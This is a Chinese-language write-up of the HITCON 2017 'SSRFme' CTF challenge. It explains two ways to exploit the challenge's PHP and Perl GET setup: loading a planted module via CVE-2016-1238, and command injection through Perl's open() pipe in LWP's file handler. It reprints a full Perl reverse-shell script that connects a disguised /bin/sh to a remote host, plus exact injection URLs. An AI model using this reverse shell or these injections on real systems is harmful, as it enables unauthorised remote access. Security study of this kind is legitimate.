分享本题自制Dockerfile：[Github](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/ssrfme) 

题目给出了源码:

```php
<?php 
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
    @mkdir($sandbox); 
    @chdir($sandbox); 

    $data = shell_exec("GET " . escapeshellarg($_GET["url"])); 
    $info = pathinfo($_GET["filename"]); 
    $dir  = str_replace(".", "", basename($info["dirname"])); 
    @mkdir($dir); 
    @chdir($dir); 
    @file_put_contents(basename($info["basename"]), $data); 
    highlight_file(__FILE__); 
```
分析源码, 可以得到程序的流程是这样的:
1. 和前面两题一样,基于ip创建沙箱文件夹
2. 将传入的URL带入命令GET执行 --- GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求
3. [解析](http://php.net/manual/zh/function.pathinfo.php)传入的filename参数
4. [获取](http://php.net/manual/zh/function.basename.php)传入filename的最后一级文件夹(若获取不为空)并创建
(没有实际做这道题, 但是猜测sandbox文件夹里面的php并不会被解析)

以下参考了moxiaoxi师傅和rr师傅的博客:
moxiaoxi师傅:http://momomoxiaoxi.com/2017/11/08/HITCON/
rr师傅:https://ricterz.me/posts/HITCON%202017%20SSRFme

学习了大师傅们的思路之后综合,这题有两个思路
- 第一个是perl5的[CVE-2016-1238](https://perl5.git.perl.org/perl.git/commit/cee96d52c39b1e7b36e1c62d38bcd8d86e9a41ab) (截止至官方wp出来的时候Orange大佬说Ubuntu 17.04 in AWS最新版本还未被修复),当解析遇到了非定义的协议(定义的协议在perl5/LWP/Protocol文件夹下可以看到, 默认支持GHTTP、cpan、data、file、ftp、gopher、http、https、loopback、mailto、nntp、nogo协议)时, 如 pr0ph3t://pr0ph3t.com, 会自动读取当前目录下的URI目录并查看是否有对应协议的pm模块并尝试eval "require xxx" 这里我们的恶意pm模块就会被执行, 具体漏洞代码在perl5/URI.pm下的136行:
```perl
sub implementor
{
    my($scheme, $impclass) = @_;
    if (!$scheme || $scheme !~ /\A$scheme_re\z/o) {
	require URI::_generic;
	return "URI::_generic";
    }

    $scheme = lc($scheme);

    if ($impclass) {
	# Set the implementor class for a given scheme
        my $old = $implements{$scheme};
        $impclass->_init_implementor($scheme);
        $implements{$scheme} = $impclass;
        return $old;
    }

    my $ic = $implements{$scheme};
    return $ic if $ic;

    # scheme not yet known, look for internal or
    # preloaded (with 'use') implementation
    $ic = "URI::$scheme";  # default location

    # turn scheme into a valid perl identifier by a simple transformation...
    $ic =~ s/\+/_P/g;
    $ic =~ s/\./_O/g;
    $ic =~ s/\-/_/g;

    no strict 'refs';
    # check we actually have one for the scheme:
    unless (@{"${ic}::ISA"}) {
        if (not exists $require_attempted{$ic}) {
            # Try to load it
            my $_old_error = $@;
           ###################################
            eval "require $ic"; #尝试包含并执行
           ###################################
            die $@ if $@ && $@ !~ /Can\'t locate.*in \@INC/;
            $@ = $_old_error;
        }
        return undef unless @{"${ic}::ISA"};
    }

    $ic->_init_implementor($scheme);
    $implements{$scheme} = $ic;
    $ic;
}
```
所以找一个perl反弹shell的程序放好在自己的VPS上, 代码:
```perl
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell. Change these.
my $ip = '127.0.0.1';
my $port = 12345;

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
        # source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
    cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

    if ($auth) {
        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
            cgiprint("ERROR: Your client isn't authorised to view this page");
            cgiexit();
        }
    }
} elsif ($auth) {
    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access");
    cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
    my $pid = fork();
    if ($pid) {
        cgiexit(0); # parent exits
    }

    setsid();
    chdir('/');
    umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    cgiprint("Sent reverse shell to $ip:$port");
    cgiprintpage();
} else {
    cgiprint("Couldn't open reverse shell to $ip:$port: $!");
    cgiexit();    
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
    my $line = shift;
    $line .= "<p>\n";
    $global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
    cgiprintpage();
    exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
    print "Content-Length: " . length($global_page) . "\r Connection: close\r Content-Type: text\/html\r\n\r\n" . $global_page;
}
```
然后请求```/?url=自己的vps的perl后门路径&filename=URI/pr0ph3t.pm```
在沙箱文件夹的URI目录下写入反弹shell的pm文件
最后监听某个端口后请求```/?url=pr0ph3t://pr0ph3t.com&filename=xxx```即可收到shell
![shell](http://upload-images.jianshu.io/upload_images/6949366-4ee42dbdac9fdbbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
- 第二个是perl的open命令有可能会导致命令执行
> https://mailman.linuxchix.org/pipermail/courses/2003-September/001344.html
>
> Executing Programs with "open"
>
> In addition to what we saw last week, the "open" command has one more very
powerful application: it allows you to execute a command, send input and
receive output.
>
> Try this program (it only works on Unix):
>
> ``` perl
> #!/usr/bin/perl -w
>   use strict;
>
>   open DATA, "who |"   or die "Couldn't execute program: $!";
>   while ( defined( my $line = <DATA> )  ) {
>     chomp($line);
>     print "$line\n";
>   }
>   close DATA;
>```
> Here's what happened: Perl saw that your "file" ended with a "pipe" (vertical
bar) character. So it interpreted the "file" as a command to be executed, and
interpreted the command's output as the "file"'s contents. The command is
"who" (which prints information on currently logged-in users). If you execute
that command, you will see that the output is exactly what the Perl program
gave you.
>
> In this case, we "read" data from the command. To execute a command that we can
"write" (send data) to, we should place a pipe character BEFORE the command.
These options are mutually exclusive: we can read from a command or write to
it, but not both.
>
> In the Unix world, a lot can be done by piping the output of one program into
the input of another. Perl continues this spirit.
>
> Note that we can also send command-line parameters to the command, like this:
>
>```perl
> open DATA, "who -H |"    or die "Couldn't execute program: $!";
>```
>In fact, Perl allows you to use "open" to do pretty much anything you would
normally do on the command-line, as this example demonstrates:
>```perl
>   open OUTPUT, "| grep 'foo' > result.txt"     or die "Failure: $!";
>```
>We can then write whatever we want to the "OUTPUT" filehandle. The Unix "grep"
command will filter out any text which doesn't contain the text "foo"; any text
>which DOES contain "foo" will be written to "result.txt".

![cmd execute](http://upload-images.jianshu.io/upload_images/6949366-e94ad9a3f5822505.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


‘feature’代码在处理file协议的perl5/LWP/Protocol/file.pm的130行,如下:
```perl
...
#第47行
    # test file exists and is readable
    unless (-e $path) {
	return HTTP::Response->new( &HTTP::Status::RC_NOT_FOUND,
				  "File `$path' does not exist");
    }
    unless (-r _) {
	return HTTP::Response->new( &HTTP::Status::RC_FORBIDDEN,
				  'User does not have read permission');
    }
...
#第127行
    # read the file
    if ($method ne "HEAD") {
	open(F, $path) or return new
	    HTTP::Response(&HTTP::Status::RC_INTERNAL_SERVER_ERROR,
			   "Cannot read file '$path': $!");
	binmode(F);
	$response =  $self->collect($arg, $response, sub {
	    my $content = "";
	    my $bytes = sysread(F, $content, $size);
	    return \$content if $bytes > 0;
	    return \ "";
	});
	close(F);
    }
...
```
首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件, 所以先请求
```/?url=file:bash -c /readflag|&filename=bash -c /readflag|``` 创建相应的同名文件
```/?url=file:bash -c /readflag|&filename=123``` 利用open的feature执行代码
最后直接访问**/sandbox/哈希值/123**就能得到flag

(安利一个文本查找工具https://blog.lilydjwg.me/tag/AG)

参考:
https://github.com/orangetw/My-CTF-Web-Challenges
http://momomoxiaoxi.com/2017/11/08/HITCON/
https://ricterz.me/posts/HITCON%202017%20SSRFme

